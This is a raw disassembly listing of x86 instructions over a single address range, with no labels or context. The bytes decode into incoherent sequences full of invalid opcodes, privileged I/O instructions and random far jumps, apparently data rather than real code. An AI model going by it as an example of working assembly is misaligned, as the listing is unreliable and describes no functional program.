  415682:	int    0xe6
  415684:	es mov esi,0xd5f8e93b
  41568a:	stos   DWORD PTR es:[edi],eax
  41568b:	das    
  41568c:	ja     0x41563f
  41568e:	jnp    0x415652
  415690:	fiadd  WORD PTR [edx+0x1c5685cf]
  415696:	fwait
  415697:	cwde   
  415698:	mov    ch,0x41
  41569a:	jge    0x415623
  41569c:	(bad)  
  41569d:	pop    ecx
  41569e:	scas   al,BYTE PTR es:[edi]
  41569f:	das    
  4156a0:	push   cs
  4156a1:	rcl    BYTE PTR [ebx+0x38],0x2f
  4156a5:	inc    esi
  4156a6:	sub    DWORD PTR ds:0x3747ebe5,esp
  4156ac:	addr16 call 0x8a5e:0xaa22a7b
  4156b4:	(bad)  
  4156b5:	mov    ebp,0x1cece2ab
  4156ba:	(bad)  
  4156bb:	fistp  DWORD PTR [ecx-0x8]
  4156be:	inc    edx
  4156bf:	js     0x4156a1
  4156c1:	xor    eax,0x4338e5f1
  4156c6:	sbb    al,0x5e
  4156c8:	dec    esp
  4156c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156ca:	fucomp st(1)
  4156cc:	push   ss
  4156cd:	test   BYTE PTR [edx+0x1],bl
  4156d0:	nop
  4156d1:	sub    bh,bh
  4156d3:	hlt    
  4156d4:	pop    ebx
  4156d5:	jl     0x41565b
  4156d7:	mov    ds:0x6b72b1bf,eax
  4156dc:	retf   0x74de
  4156df:	loope  0x41569d
  4156e1:	jnp    0x415758
  4156e3:	sahf   
  4156e4:	cmp    al,0xea
  4156e6:	in     al,0x27
  4156e8:	call   0xb6edf12f
  4156ed:	sub    eax,0xc72ad687
  4156f2:	mov    DWORD PTR [edi],esp
  4156f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156f5:	mov    ds:0x1db448b3,al
  4156fa:	jg     0x41568a
  4156fc:	mov    cl,0xe
  4156fe:	cmc    
  4156ff:	ds (bad) 
  415701:	push   ss
  415702:	pop    edx
  415703:	push   esp
  415704:	or     al,0x5d
  415706:	aaa    
  415707:	fnstenv [edx+0x5a]
  41570a:	push   eax
  41570b:	mov    ds:0xfdf50757,eax
  415710:	outs   dx,BYTE PTR ds:[esi]
  415711:	add    eax,0xf9a45edf
  415716:	into   
  415717:	daa    
  415718:	inc    edx
  415719:	mov    BYTE PTR [eax+0x3ae2786a],bl
  41571f:	repnz add bh,cl
  415722:	push   0xffffffe4
  415724:	xlat   BYTE PTR ds:[ebx]
  415725:	mov    eax,ds:0x28f156c0
  41572a:	pop    edi
  41572b:	mov    eax,0x6d42d349
  415730:	outs   dx,DWORD PTR ds:[esi]
  415731:	in     eax,0x24
  415733:	sbb    BYTE PTR [ebx+0x1a7d1780],0xa8
  41573a:	push   esi
  41573b:	rol    BYTE PTR [edx-0x10ebcbc6],0x43
  415742:	xor    eax,0x1f5d59f8
  415747:	lds    edi,FWORD PTR [ebp+0x185a129c]
  41574d:	ror    DWORD PTR [ecx-0x68fecc5c],cl
  415753:	shl    BYTE PTR [edi],1
  415755:	jmp    0x367856eb
  41575a:	in     al,0x3d
  41575c:	pop    esi
  41575d:	in     al,0xdf
  41575f:	dec    edx
  415760:	pop    ebp
  415761:	hlt    
  415762:	push   ecx
  415763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415764:	or     eax,0xd9581746
  415769:	cld    
  41576a:	and    edx,DWORD PTR [edx+ecx*4]
  41576d:	push   es
  41576e:	and    ah,dl
  415770:	lock sub DWORD PTR ds:0x4d10b64c,ecx
  415777:	mov    eax,0x9d8b2751
  41577c:	push   cs
  41577d:	enter  0xb0f1,0xf9
  415781:	in     al,dx
  415782:	jl     0x415802
  415784:	cdq    
  415785:	adc    cl,BYTE PTR [edi-0x1b]
  415788:	sahf   
  415789:	inc    ebp
  41578a:	pop    ds
  41578b:	neg    BYTE PTR [edx-0x5f]
  41578e:	data16 cmp BYTE PTR ds:0x7fe25734,al
  415795:	test   ebx,eax
  415797:	std    
  415798:	js     0x415789
  41579a:	or     eax,0xe2bc47ff
  41579f:	or     ebx,DWORD PTR [ebx]
  4157a1:	mov    eax,0x6d2eb230
  4157a6:	fdiv   QWORD PTR [esi+ebx*1-0xb534a49]
  4157ad:	xor    eax,edi
  4157af:	repz push ecx
  4157b1:	mov    ds:0x4d8452bb,al
  4157b6:	rcr    BYTE PTR [esi+0x58],1
  4157b9:	enter  0xd87,0xa6
  4157bd:	test   BYTE PTR [ecx],cl
  4157bf:	sub    BYTE PTR [esi+0x64],bl
  4157c2:	mov    ebx,DWORD PTR [edi+0x38]
  4157c5:	xchg   edi,eax
  4157c6:	out    dx,eax
  4157c7:	jmp    0x41582d
  4157c9:	aas    
  4157ca:	push   esi
  4157cb:	das    
  4157cc:	xchg   esi,eax
  4157cd:	iret   
  4157ce:	rol    bl,cl
  4157d0:	mov    dh,0xa6
  4157d2:	xor    ebx,DWORD PTR [eax]
  4157d4:	inc    eax
  4157d5:	mov    BYTE PTR [edi-0x72e2a9f2],cl
  4157db:	sub    al,0x77
  4157dd:	mov    edx,0x6a1a9373
  4157e2:	aas    
  4157e3:	mov    edx,0xf81254a2
  4157e8:	not    esp
  4157ea:	arpl   WORD PTR [esi-0x2d2ed08a],bx
  4157f0:	xor    DWORD PTR fs:[edx],ebp
  4157f3:	jnp    0x415782
  4157f5:	mov    ebx,0xab882db0
  4157fa:	jmp    0xe48210e5
  4157ff:	jno    0x41580e
  415801:	sbb    edx,eax
  415803:	gs dec ebp
  415805:	and    BYTE PTR [ebp+0x16],0xeb
  415809:	scas   eax,DWORD PTR es:[edi]
  41580a:	or     al,0x11
  41580c:	cmp    al,0x71
  41580e:	mov    dl,BYTE PTR [edx]
  415810:	(bad)
  415814:	or     BYTE PTR [ecx+0x13],ah
  415817:	sbb    DWORD PTR [esp+ebp*2],0x54f28c69
  41581e:	dec    ecx
  41581f:	(bad)  
  415820:	fist   WORD PTR [ebx]
  415822:	inc    ebx
  415823:	test   eax,0x111b0a41
  415828:	mov    dh,0xd
  41582a:	pop    esi
  41582b:	loopne 0x41584f
  41582d:	cmp    edx,ebx
  41582f:	mov    ds:0x687918fb,al
  415834:	icebp  
  415835:	in     al,0xf2
  415837:	aaa    
  415838:	cdq    
  415839:	sbb    BYTE PTR [edi-0x3b],bh
  41583c:	aas    
  41583d:	jnp    0x4157ee
  41583f:	push   eax
  415840:	loope  0x4157e3
  415842:	hlt    
  415843:	popf   
  415844:	aaa    
  415845:	loop   0x415849
  415847:	jmp    0xb13a:0xef7a121b
  41584e:	fwait
  41584f:	lods   eax,DWORD PTR ds:[esi]
  415850:	lods   al,BYTE PTR ds:[esi]
  415851:	pusha  
  415852:	mov    esp,0x7178c2bd
  415857:	adc    edi,DWORD PTR [ebx]
  415859:	jo     0x4158a5
  41585b:	mov    eax,0x41860bcb
  415860:	(bad)  
  415861:	out    0xe0,eax
  415863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415864:	cmp    edx,DWORD PTR [eax+0x3b]
  415867:	push   ecx
  415868:	push   ds
  415869:	aas    
  41586a:	add    ebx,DWORD PTR [edi+0x5d]
  41586d:	dec    esp
  41586e:	outs   dx,BYTE PTR ds:[esi]
  41586f:	jne    0x415855
  415871:	js     0x415837
  415873:	mov    bl,0x65
  415875:	mov    al,ds:0xf17b70a8
  41587a:	inc    ebx
  41587b:	push   ebx
  41587c:	mov    ch,0x94
  41587e:	test   BYTE PTR [eax-0x5bf63bf8],0xe4
  415885:	sub    BYTE PTR fs:[eax-0x3f],0xc9
  41588a:	push   ecx
  41588b:	add    edi,DWORD PTR [edx]
  41588d:	fisttp WORD PTR [edi-0x6a]
  415890:	jecxz  0x41590a
  415892:	hlt    
  415893:	cmp    DWORD PTR [eax+0x14],esi
  415896:	mov    eax,0xd3f5cc30
  41589c:	mov    al,ds:0x8daee253
  4158a1:	pop    ebp
  4158a2:	(bad)  [eax]
  4158a4:	xchg   ebx,eax
  4158a5:	pop    edx
  4158a6:	pop    ss
  4158a7:	int    0x2e
  4158a9:	push   ss
  4158aa:	into   
  4158ab:	or     al,0x33
  4158ad:	and    eax,0xf3a3e9e3
  4158b2:	popa   
  4158b3:	in     al,0xe4
  4158b5:	in     al,dx
  4158b6:	cwde   
  4158b7:	xor    al,0x7d
  4158b9:	or     ebx,DWORD PTR [eax+0x41]
  4158bc:	mov    al,0x8f
  4158be:	loope  0x4158a9
  4158c0:	inc    ebx
  4158c1:	imul   esp,DWORD PTR [ebp-0x27],0x42
  4158c5:	add    eax,0xcf2abad8
  4158ca:	adc    BYTE PTR [eax-0x4b],al
  4158cd:	xchg   ebp,eax
  4158ce:	mov    bl,0x6c
  4158d0:	push   ds
  4158d1:	adc    al,0x9f
  4158d3:	add    al,0xd2
  4158d5:	cmp    DWORD PTR [edx+edi*4+0x70d7071c],esp
  4158dc:	mov    esp,edx
  4158de:	leave  
  4158df:	sub    DWORD PTR [ebx+0x74],edi
  4158e2:	or     eax,0x7e4ba63a
  4158e7:	fisub  DWORD PTR ds:0x9affe749
  4158ed:	lods   eax,DWORD PTR ds:[esi]
  4158ee:	int    0x5
  4158f0:	or     BYTE PTR ds:0x546bc0c,al
  4158f6:	dec    esp
  4158f7:	and    BYTE PTR [eax+0x58899bb4],dh
  4158fd:	cmp    bl,dh
  4158ff:	pop    esi
  415900:	push   ss
  415901:	into   
  415902:	cmp    al,0xa5
  415904:	clc    
  415905:	xor    eax,ecx
  415907:	add    al,dl
  415909:	xor    dh,bh
  41590b:	arpl   WORD PTR [edx],dx
  41590d:	inc    ebp
  41590e:	mov    fs,WORD PTR [ecx]
  415910:	pusha  
  415911:	imul   ebx,edx,0x75da71d5
  415917:	daa    
  415918:	mov    esp,0x637b48
  41591d:	jmp    FWORD PTR [ebx-0x793eaae6]
  415923:	in     eax,0x35
  415925:	scas   al,BYTE PTR es:[edi]
  415926:	les    ebp,FWORD PTR [esi*1-0x397d9fdb]
  41592d:	lods   al,BYTE PTR ds:[esi]
  41592e:	aad    0x2c
  415930:	cmovae eax,DWORD PTR [esi]
  415933:	jecxz  0x4158d1
  415935:	mov    WORD PTR [eax+0x387d1913],gs
  41593b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41593c:	or     DWORD PTR [esi+0x685c54f6],ebx
  415942:	sbb    BYTE PTR [eax+0x69],ch
  415945:	jno    0x415938
  415947:	hlt    
  415948:	sbb    al,0xf7
  41594a:	fcom   DWORD PTR [ecx+0x7803b845]
  415950:	pop    edi
  415951:	pop    eax
  415952:	shr    DWORD PTR [ebp-0x1800e303],1
  415958:	mov    cl,0x37
  41595a:	outs   dx,BYTE PTR gs:[esi]
  41595c:	lea    esp,[edi]
  41595e:	(bad)  
  41595f:	sti    
  415960:	dec    edx
  415961:	std    
  415962:	sahf   
  415963:	mov    al,ds:0x7de43c62
  415968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415969:	data16 xor BYTE PTR [edi],dh
  41596c:	(bad)  
  41596e:	mov    eax,0xef70ab4d
  415973:	jbe    0x41599b
  415975:	ret    0xa4ec
  415978:	jp     0x4158fa
  41597a:	test   al,0x24
  41597c:	addr16 jp 0x415936
  41597f:	sar    DWORD PTR [eax+0x76],0x75
  415983:	enter  0x4299,0xb2
  415987:	pop    ebp
  415988:	dec    ebx
  415989:	loope  0x4159c3
  41598b:	xchg   DWORD PTR ds:0xb7ea5c37,ecx
  415991:	inc    esp
  415992:	inc    edi
  415993:	mov    gs,eax
  415995:	loop   0x41595d
  415997:	sbb    bl,bl
  415999:	aad    0xe1
  41599b:	sahf   
  41599c:	sub    DWORD PTR [ebx],0xffffffa9
  41599f:	dec    esi
  4159a0:	rcr    BYTE PTR [edi+0x53],cl
  4159a3:	jl     0x415961
  4159a5:	jne    0x4159b5
  4159a7:	add    bh,BYTE PTR [esi+edx*4+0x26f12604]
  4159ae:	les    ecx,FWORD PTR [ecx]
  4159b0:	js     0x415a22
  4159b2:	mov    ebx,edx
  4159b4:	adc    eax,0x18216568
  4159b9:	fwait
  4159ba:	(bad)  
  4159bb:	push   ebp
  4159bc:	dec    ecx
  4159bd:	fsubp  st(0),st
  4159bf:	mov    eax,0x5f810604
  4159c4:	push   edi
  4159c5:	xchg   ebx,eax
  4159c6:	push   0x18
  4159c8:	retf   
  4159c9:	dec    esp
  4159ca:	ss stc 
  4159cc:	ret    
  4159cd:	enter  0x6976,0x3b
  4159d1:	ins    BYTE PTR es:[edi],dx
  4159d2:	xor    ebp,DWORD PTR [esi]
  4159d4:	ds loope 0x4159cc
  4159d7:	aas    
  4159d8:	xor    eax,0x7a05fb5b
  4159dd:	mov    ebp,0x80cd466a
  4159e2:	lahf   
  4159e3:	and    DWORD PTR cs:[edi-0x4d],ebx
  4159e7:	(bad)  fs:[eax+0x78baafbd]
  4159ee:	leave  
  4159ef:	pop    ebx
  4159f0:	mov    esi,0xa11a0ae
  4159f5:	jmp    0xba0d:0x9162191b
  4159fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159fd:	fld    DWORD PTR [edi+0x4c2c0a76]
  415a03:	and    DWORD PTR [esi-0x2c5516ff],esi
  415a09:	call   0xb879c0f0
  415a0e:	or     al,0x7e
  415a10:	cwde   
  415a11:	cdq    
  415a12:	jp     0x415a05
  415a14:	jb     0x415a45
  415a16:	jmp    0xd73a:0xec801713
  415a1d:	cld    
  415a1e:	or     al,0x86
  415a20:	dec    ebp
  415a21:	int    0xb4
  415a23:	cld    
  415a24:	cmp    eax,0xf41ddad1
  415a29:	mov    esi,0x3fa1ec3a
  415a2e:	mov    bh,0xc3
  415a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a31:	mov    cl,0x84
  415a33:	adc    al,0x56
  415a35:	fwait
  415a36:	jne    0x415a70
  415a38:	test   DWORD PTR [edx+0x7ba67a2b],esi
  415a3e:	sar    BYTE PTR [edi],1
  415a40:	sub    esp,DWORD PTR ds:[ebx-0x6a3c37ae]
  415a47:	add    BYTE PTR [edx+0x2a83341d],al
  415a4d:	(bad)  
  415a4e:	fwait
  415a4f:	pop    ebp
  415a50:	mov    BYTE PTR [esi],bh
  415a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a53:	jns    0x415a3f
  415a55:	cmp    edx,DWORD PTR ds:0x2c4ed21f
  415a5b:	inc    esp
  415a5c:	pushf  
  415a5d:	push   es
  415a5e:	cmc    
  415a5f:	mov    ds:0x6100104b,al
  415a64:	push   ss
  415a65:	fiadd  DWORD PTR [ebx]
  415a67:	arpl   WORD PTR [edi+0x5f],cx
  415a6a:	or     ch,ch
  415a6c:	mov    ah,0x47
  415a6e:	push   eax
  415a6f:	mov    ds:0x332c68fa,al
  415a74:	sub    esp,DWORD PTR [edi+0x21]
  415a77:	pop    ebx
  415a78:	push   esi
  415a79:	inc    edi
  415a7a:	loopne 0x415a98
  415a7c:	dec    ebx
  415a7d:	sbb    al,0xac
  415a7f:	(bad)  
  415a80:	xlat   BYTE PTR ds:[ebx]
  415a81:	pushf  
  415a82:	(bad)
  415a86:	dec    eax
  415a87:	jg     0x415aa2
  415a89:	ss cwde 
  415a8b:	mov    eax,ds:0x6a882c64
  415a90:	jmp    0x40b711ec
  415a95:	xchg   ecx,eax
  415a96:	out    0x9f,eax
  415a98:	ficomp WORD PTR [ecx-0x50]
  415a9b:	icebp  
  415a9c:	stc    
  415a9d:	data16 add dl,bl
  415aa0:	loopne 0x415aeb
  415aa2:	sub    DWORD PTR [ebp-0x75],0x1a0e360a
  415aa9:	jg     0x415a43
  415aab:	jge    0x415a5c
  415aad:	mov    edx,0x542317e
  415ab2:	xchg   edx,eax
  415ab3:	jmp    0x40a61c13
  415ab8:	or     eax,0x5167241e
  415abd:	out    0x83,eax
  415abf:	les    ecx,FWORD PTR [edi+0x39]
  415ac2:	iret   
  415ac3:	cmc    
  415ac4:	xchg   ebp,eax
  415ac5:	sub    ch,BYTE PTR [edx-0x61]
  415ac8:	outs   dx,DWORD PTR ds:[esi]
  415ac9:	loop   0x415b29
  415acb:	jns    0x415a5a
  415acd:	push   edi
  415ace:	or     esp,DWORD PTR [edx]
  415ad0:	mov    eax,cs
  415ad2:	leave  
  415ad3:	bound  edi,QWORD PTR [esi+edx*4+0x1daa901]
  415ada:	mov    cl,BYTE PTR [esi-0x6]
  415add:	add    al,0xbf
  415adf:	test   ch,0x7b
  415ae2:	cli    
  415ae3:	test   eax,0x8ad8bd8b
  415ae8:	push   esp
  415ae9:	fwait
  415aea:	lock xor eax,DWORD PTR [ecx+0x48]
  415aee:	xchg   esp,eax
  415aef:	sub    BYTE PTR [ebx-0x1d],bl
  415af2:	out    dx,al
  415af3:	jnp    0x415b5d
  415af5:	mov    ds:0x8689d006,al
  415afa:	mov    bl,0x2c
  415afc:	jg     0x415ad2
  415afe:	mov    esi,0x19c96564
  415b03:	je     0x415ad6
  415b05:	(bad)  
  415b06:	fndisi(8087 only) 
  415b08:	or     ebp,ebp
  415b0a:	ds jp  0x415b13
  415b0d:	adc    eax,0xb4eb6003
  415b12:	xchg   edx,eax
  415b13:	inc    eax
  415b14:	mov    ds:0x4781d251,al
  415b19:	inc    ecx
  415b1a:	xchg   edi,eax
  415b1b:	out    dx,al
  415b1c:	and    BYTE PTR [ebx-0x18441136],dh
  415b22:	xchg   esi,eax
  415b23:	or     al,0x22
  415b25:	push   esp
  415b26:	sbb    esp,DWORD PTR [edi]
  415b28:	xor    al,0x66
  415b2a:	rcr    BYTE PTR [eax],cl
  415b2c:	mov    bl,0x76
  415b2e:	jns    0x415ba6
  415b30:	inc    ebp
  415b31:	daa    
  415b32:	sub    edi,DWORD PTR [eax+0x7c]
  415b35:	retf   0xd3d3
  415b38:	cmp    eax,0x2797303a
  415b3d:	leave  
  415b3e:	and    eax,0x392f5f2b
  415b43:	push   ds
  415b44:	xor    BYTE PTR ds:0x9e0a0d68,0x39
  415b4b:	mov    bl,0xd1
  415b4d:	sbb    al,0xea
  415b4f:	dec    esi
  415b50:	add    al,0xbf
  415b52:	mov    bl,0x18
  415b54:	xor    al,0x4c
  415b56:	(bad)  
  415b57:	push   0x1c4bd371
  415b5c:	xor    dl,0xb
  415b5f:	pop    esi
  415b60:	mov    eax,ds:0xf0080568
  415b65:	js     0x415b19
  415b67:	pop    ebp
  415b68:	jbe    0x415b4f
  415b6a:	scas   al,BYTE PTR es:[edi]
  415b6b:	(bad)
  415b6f:	dec    ebp
  415b70:	sbb    eax,0x51f7a899
  415b75:	cld    
  415b76:	pop    edi
  415b77:	(bad)  
  415b78:	mov    ch,0xc1
  415b7a:	mov    dh,0xe3
  415b7c:	push   0x581356ec
  415b81:	ret    0x36b0
  415b84:	jbe    0x415b80
  415b86:	xor    BYTE PTR [eax-0xf80c955],cl
  415b8c:	jmp    0x415bbf
  415b8e:	std    
  415b8f:	arpl   WORD PTR [edx+0x6f6da625],dx
  415b95:	cmp    ch,dh
  415b97:	jp     0x415b71
  415b99:	xor    al,0x53
  415b9b:	sub    eax,0x9a05f5df
  415ba0:	sti    
  415ba1:	je     0x415bea
  415ba3:	cmp    BYTE PTR [edx],dl
  415ba5:	out    dx,al
  415ba6:	aaa    
  415ba7:	ins    BYTE PTR es:[edi],dx
  415ba8:	or     bh,BYTE PTR [ebp+eiz*4-0x77833ad4]
  415baf:	(bad)  
  415bb0:	xchg   esp,eax
  415bb1:	xchg   ecx,eax
  415bb2:	addr16 xchg ebp,eax
  415bb4:	ret    0x694b
  415bb7:	(bad)  
  415bb8:	jle    0x415bdb
  415bba:	xchg   ebp,eax
  415bbb:	add    bl,ch
  415bbd:	loopne 0x415bdf
  415bbf:	dec    eax
  415bc0:	cmc    
  415bc1:	adc    BYTE PTR [ebx-0x2b7433a],dl
  415bc7:	push   esp
  415bc8:	sub    DWORD PTR [ecx+0x44f68d36],edx
  415bce:	je     0x415bd9
  415bd0:	add    eax,0xaaa2bb66
  415bd5:	outs   dx,BYTE PTR ds:[esi]
  415bd6:	test   al,0x49
  415bd8:	into   
  415bd9:	call   0xeea16be7
  415bde:	mov    ecx,0x1f9c7e51
  415be3:	out    dx,al
  415be4:	lahf   
  415be5:	xlat   BYTE PTR ds:[ebx]
  415be6:	dec    esi
  415be7:	std    
  415be8:	bound  esp,QWORD PTR [esi]
  415bea:	cmp    cl,al
  415bec:	iret   
  415bed:	(bad)  [ebx-0x4a]
  415bf0:	mov    ebp,0xf28de806
  415bf5:	xor    eax,0x820e466b
  415bfa:	loop   0x415c51
  415bfc:	push   es
  415bfd:	push   esp
  415bfe:	sub    BYTE PTR [edi],cl
  415c00:	rcr    DWORD PTR [ecx+0x49],cl
  415c03:	pop    edx
  415c04:	push   edi
  415c05:	or     ch,bl
  415c07:	mov    esi,0xd5e89858
  415c0c:	aam    0x92
  415c0e:	int    0x4
  415c10:	nop
  415c11:	xchg   esp,eax
  415c12:	fdivrp st(3),st
  415c14:	ja     0x415c7b
  415c16:	adc    BYTE PTR [edi-0x1da058a2],bh
  415c1c:	add    DWORD PTR [edx],edx
  415c1e:	xor    eax,0x5a364eda
  415c23:	inc    eax
  415c24:	mov    esp,0x66b2d8e4
  415c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c2a:	jno    0x415c75
  415c2c:	add    al,BYTE PTR [esi]
  415c2e:	xchg   BYTE PTR ds:0xb0a97145,dh
  415c34:	mov    ebx,0xd8e54e17
  415c39:	and    eax,0x9cd613c8
  415c3e:	push   ds
  415c3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c40:	call   0x66d29e91
  415c45:	inc    eax
  415c46:	popf   
  415c47:	push   0x58
  415c49:	lea    esp,[ecx+ebp*2-0x68]
  415c4d:	retf   
  415c4e:	cmp    edx,DWORD PTR [esi-0x7c]
  415c51:	inc    eax
  415c53:	std    
  415c54:	adc    edi,DWORD PTR [eax-0x48b83221]
  415c5a:	(bad)  
  415c5b:	bound  ebx,QWORD PTR [edi+edx*4-0x50]
  415c5f:	ins    BYTE PTR es:[edi],dx
  415c60:	ds sub eax,0xf32dd907
  415c66:	fsub   QWORD PTR [ebp+0x7c]
  415c69:	xchg   edx,eax
  415c6a:	lods   eax,DWORD PTR ds:[esi]
  415c6b:	push   cs
  415c6c:	retf   
  415c6d:	pop    es
  415c6e:	jae    0x415c29
  415c70:	imul   esp,DWORD PTR [edx+ebx*1],0x7c05f076
  415c77:	push   esp
  415c78:	scas   eax,DWORD PTR es:[edi]
  415c79:	cmp    ebx,ebx
  415c7b:	in     eax,0x35
  415c7d:	jmp    0x8882:0x2a477048
  415c84:	adc    edi,eax
  415c86:	mov    al,0x98
  415c88:	push   ecx
  415c89:	mov    al,0x56
  415c8b:	add    al,0x6b
  415c8d:	xchg   ebx,eax
  415c8e:	jp     0x415c32
  415c90:	into   
  415c91:	pop    edx
  415c92:	add    DWORD PTR gs:[ecx],ecx
  415c95:	lock add ebp,DWORD PTR [esi]
  415c98:	pop    ss
  415c99:	jb     0x415c55
  415c9b:	jno    0x415cf2
  415c9d:	mov    esi,0xfacccb54
  415ca2:	push   eax
  415ca3:	xchg   edi,eax
  415ca4:	or     BYTE PTR [edi],dl
  415ca6:	cmp    eax,0xce94128
  415cab:	xchg   ebp,eax
  415cac:	pop    ecx
  415cad:	pushf  
  415cae:	retf   0x9ffd
  415cb1:	mov    ds:0xbe0eec4b,eax
  415cb6:	xchg   esi,esp
  415cb8:	xchg   BYTE PTR [edx],al
  415cba:	jns    0x415d27
  415cbc:	mov    eax,ds:0x44b33b7d
  415cc1:	or     esp,DWORD PTR [eax+0x778a53e7]
  415cc7:	xchg   esp,eax
  415cc8:	inc    esp
  415cc9:	xor    ebp,ecx
  415ccb:	dec    ebp
  415ccc:	popf   
  415ccd:	push   esp
  415cce:	or     BYTE PTR [bx],dh
  415cd1:	cmc    
  415cd2:	(bad)  
  415cd3:	jbe    0x415ccd
  415cd5:	lahf   
  415cd6:	sbb    eax,0x2c03dfb0
  415cdb:	bound  ebp,QWORD PTR [edi+0x269b5b0a]
  415ce1:	enter  0xbf27,0x84
  415ce5:	push   edx
  415ce6:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ce8:	mov    ch,0x2
  415cea:	int    0x2c
  415cec:	iret   
  415ced:	je     0x415cc8
  415cef:	test   DWORD PTR [edx+0x3416e607],ebp
  415cf5:	mov    bh,BYTE PTR [ebx+0x56745cf4]
  415cfb:	dec    esp
  415cfc:	inc    ebp
  415cfd:	cdq    
  415cfe:	xchg   bl,dl
  415d00:	push   ebp
  415d01:	inc    ebx
  415d02:	popf   
  415d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d04:	scas   al,BYTE PTR es:[edi]
  415d05:	fs pushf 
  415d07:	xchg   ecx,eax
  415d08:	push   ds
  415d09:	mov    cl,0xf0
  415d0b:	ret    
  415d0c:	xlat   BYTE PTR ds:[ebx]
  415d0d:	call   0xc143:0xa68b5ffb
  415d14:	out    dx,al
  415d15:	sbb    eax,0x7807e12f
  415d1a:	push   ebx
  415d1b:	mov    esi,0xba554b1b
  415d20:	mov    edx,esi
  415d22:	cli    
  415d23:	add    dl,BYTE PTR [edi+0x14]
  415d26:	xor    edx,DWORD PTR [esi-0x11]
  415d29:	cs loope 0x415d5b
  415d2c:	dec    esi
  415d2d:	idiv   DWORD PTR [ebp-0x3b]
  415d30:	mov    ch,0xb
  415d32:	inc    esi
  415d33:	pop    edi
  415d34:	enter  0x3935,0x93
  415d38:	mov    ?,ebp
  415d3a:	jne    0x415d52
  415d3c:	fnstcw WORD PTR [ecx]
  415d3e:	mov    ds:0x716ecc2f,eax
  415d43:	inc    ecx
  415d44:	icebp  
  415d45:	pusha  
  415d46:	push   cs
  415d47:	stos   DWORD PTR es:[edi],eax
  415d48:	call   0x9d97:0x7d3920f8
  415d4f:	daa    
  415d50:	jb     0x415daf
  415d52:	inc    ebx
  415d53:	inc    ebx
  415d54:	xchg   ebx,eax
  415d55:	scas   al,BYTE PTR es:[edi]
  415d56:	mov    BYTE PTR [esi-0x7c9157fc],0x63
  415d5d:	lea    edx,[edi-0x5d61771e]
  415d63:	lods   al,BYTE PTR ds:[esi]
  415d64:	cs jmp 0xc5a9:0x4a24
  415d6b:	push   ebx
  415d6c:	imul   ecx,edx,0x92336a08
  415d72:	xchg   esp,eax
  415d73:	xor    ah,BYTE PTR [edx]
  415d75:	fucomip st,st(2)
  415d77:	ret    0x8288
  415d7a:	enter  0x41d7,0xe7
  415d7e:	sbb    eax,0x9ad8a72e
  415d83:	test   BYTE PTR [ecx+0x5a],al
  415d86:	aad    0x5e
  415d88:	enter  0x4b66,0x8a
  415d8c:	mov    bh,0xb8
  415d8e:	pop    ss
  415d8f:	inc    esi
  415d90:	lods   eax,DWORD PTR ds:[esi]
  415d91:	repnz jmp 0x9fe8:0xb499742e
  415d99:	shr    DWORD PTR [edx+esi*1-0x16b4e221],1
  415da0:	cmp    BYTE PTR [ebx-0x3bd47ddc],bl
  415da6:	jno    0x415dd3
  415da8:	lahf   
  415da9:	(bad)  
  415dab:	jge    0x415d55
  415dad:	inc    ebx
  415dae:	arpl   WORD PTR [ebx+eax*1-0x78dd0b41],bp
  415db5:	and    al,0xd8
  415db7:	mov    ah,0x8b
  415db9:	retf   
  415dba:	stos   BYTE PTR es:[edi],al
  415dbb:	(bad)  
  415dbc:	(bad)  
  415dbd:	jnp    0x415dc6
  415dbf:	sub    DWORD PTR [ecx],0xffffff9d
  415dc2:	add    BYTE PTR [ebp-0x32],ch
  415dc5:	jmp    0x319f:0x577e857c
  415dcc:	adc    al,0xb3
  415dce:	jmp    0xbfd9:0x70b5e2c5
  415dd5:	inc    ebp
  415dd6:	jmp    0x415dac
  415dd8:	pushf  
  415dd9:	xor    DWORD PTR [ebx+ebx*8+0x1a],edx
  415ddd:	mov    ebx,0x2a0cd660
  415de2:	aam    0x2
  415de4:	cmp    al,0x56
  415de6:	dec    esp
  415de7:	mov    eax,0x723b7d65
  415dec:	mov    dl,BYTE PTR [edi-0x78916726]
  415df2:	call   0x5644:0x80ed4379
  415df9:	or     al,0xe6
  415dfb:	lock and WORD PTR ss:0x9ac8f7a2,bx
  415e04:	scas   eax,DWORD PTR es:[edi]
  415e05:	mov    ch,0xb4
  415e07:	daa    
  415e08:	fs push cs
  415e0a:	fdivr  st(6),st
  415e0c:	jp     0x415e74
  415e0e:	inc    edx
  415e0f:	aaa    
  415e10:	loop   0x415e52
  415e12:	sti    
  415e13:	push   0xffffffda
  415e15:	xchg   edx,eax
  415e16:	push   ebp
  415e17:	retf   
  415e18:	and    DWORD PTR [edx+0x2d4296f9],ebx
  415e1e:	pop    edx
  415e1f:	fmul   QWORD PTR [edi+edi*2+0x22246507]
  415e26:	dec    esp
  415e27:	pushf  
  415e28:	ret    
  415e29:	lods   al,BYTE PTR ds:[esi]
  415e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e2b:	out    0xc9,al
  415e2d:	mov    eax,ds:0xd3af4ee
  415e32:	retf   0xf4f6
  415e35:	or     al,0x6c
  415e37:	bound  ecx,QWORD PTR [edi-0x500957e8]
  415e3d:	imul   esi
  415e3f:	into   
  415e40:	mov    esi,0x827ea7e6
  415e45:	es test eax,0x457d8067
  415e4b:	adc    dh,BYTE PTR [edx]
  415e4d:	jmp    0x3a2e:0x93eeba9c
  415e54:	mov    dl,0xf2
  415e56:	das    
  415e57:	add    esp,DWORD PTR [edi-0x4c1c71f3]
  415e5d:	neg    ah
  415e5f:	jle    0x415e39
  415e61:	js     0x415e52
  415e63:	mov    ch,0x90
  415e65:	imul   ebx,DWORD PTR [ebp+0x5f],0x5b
  415e69:	pop    esp
  415e6a:	pop    edi
